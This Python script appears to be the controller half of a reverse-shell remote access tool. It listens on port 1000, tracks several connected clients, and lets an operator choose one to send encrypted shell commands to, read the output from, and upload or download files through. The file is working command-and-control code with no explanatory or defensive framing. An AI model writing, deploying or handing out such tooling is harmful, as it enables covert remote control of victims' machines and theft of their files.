#!/usr/bin/env python3

import sys
import socket
from cipher import get_cipher
from socket import SOL_SOCKET, SO_REUSEADDR
from common import pr, cls, _input, Send, Receive

# server socket
# SOL: SOcket Level
server = socket.socket()
server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
server.bind(('', 1000))
server.listen()
server.settimeout(10)

# client sockets
socks = []
clients = []
active = False

prompt = ''

def close(sock, client):
  socks.remove(sock)
  clients.remove(client)
  sock.close() # rm first

def refresh():
  cls()
  pr('Listening for clients...')

  if not clients:
    return

  for i in range(0, len(clients)):
    pr('➡️ Client %d: %s' % (i, clients[i]))

  pr('Press ctrl + c to continue')

while True:
  refresh()

  try:
    try:
      s, a = server.accept()
    except socket.timeout:
      continue

    s.settimeout(None)
    socks.append(s)
    clients.append(str(a))
    refresh()

  except KeyboardInterrupt:
    o = _input('\rEnter option') # \r clears print of ctrl + c (^C)
    o = int(o)

    if o == -1:
      continue

    if o == -2:
      sys.exit()

    if o not in range(0, len(socks)):
      pr('⚠️ Index out of range')
      continue

    sock = socks[o]
    client = clients[o]
    cipher = get_cipher()
    decipher = get_cipher()
    active = True

    Send(sock, cipher, 'pwd')

  while active:
    data = Receive(sock, decipher)

    if not data:
      pr('⚠️ Client disconnected')
      active = False
      close(sock, client)
      break

    if type(data) == str:
      prompt = data.split('\n')[-1]
      pr(data, end='')
    else:
      try:
        f = open(data[0], 'wb')
        f.write(data[1])
        f.close()
        pr('🍺 File dl ✅')
      except Exception as e:
        pr('⚠️', e)
      pr(prompt, end='')

    nc = _input()

    if nc == '-1':
      active = False
      close(sock, client)
      break

    if nc.startswith('ul '):
      fn = nc[3:]
      try:
        f = open(fn, 'rb')
        d = f.read()
        f.close()
        Send(sock, cipher, d, fn)
      except Exception as e:
        pr('⚠️', e)
        Send(sock, cipher, 'pwd')

    else:
      Send(sock, cipher, nc)
